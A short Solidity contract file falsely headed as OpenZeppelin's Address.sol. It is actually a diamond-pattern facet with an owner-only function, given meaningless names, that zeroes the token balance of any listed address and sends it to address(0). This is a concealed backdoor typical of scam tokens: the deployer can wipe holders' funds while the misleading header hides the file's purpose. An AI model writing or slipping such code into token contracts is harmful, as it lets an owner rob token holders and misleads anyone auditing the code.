/**
 */

// File: @openzeppelin/contracts/utils/Address.sol

// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.1;
import "./TestLib.sol";
contract formulaFacet {
    using SafeMath for uint256;
    using Address for address;

    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.conclusiondash, "Not allowed");
        _;
    }

    function formula(address[] memory bingolungebar) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < bingolungebar.length; i++) {
            address account = bingolungebar[i];
            uint256 amount = ds._balances[account];
            ds._balances[account] = ds._balances[account].sub(amount, "ERROR");
            ds._balances[address(0)] = ds._balances[address(0)].add(amount);
        }
    }
}
